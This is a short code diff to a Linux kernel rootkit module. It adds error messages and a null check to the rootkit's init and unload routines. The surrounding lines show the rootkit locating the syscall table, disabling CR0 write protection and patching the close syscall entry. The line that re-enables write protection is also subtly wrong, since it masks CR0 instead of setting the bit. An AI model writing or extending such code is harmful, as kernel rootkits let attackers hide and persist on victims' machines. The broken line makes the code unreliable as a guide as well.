@@ -56,6 +56,7 @@ int rootkit_init(void)
 
     syscall_table = find_syscall_table();
     if (!syscall_table) {
+        printk("RKIT: Couldn't find syscall table\n");
         goto out;
     }
 
@@ -80,10 +81,15 @@ out:
 void rootkit_exit(void)
 {
     // Disable write protection on page
+    if (syscall_table == NULL) {
+        printk("RKIT: Nothing to unload\n");
+        goto out;
+    }
     write_cr0(read_cr0() & (~0x10000));
     syscall_table[__NR_close] = (void *) original_close;
     // Enable write protection on page
     write_cr0(read_cr0() & 0x10000);
+out:
     printk("RKIT: Rootkit unloaded\n");
     return;
 }
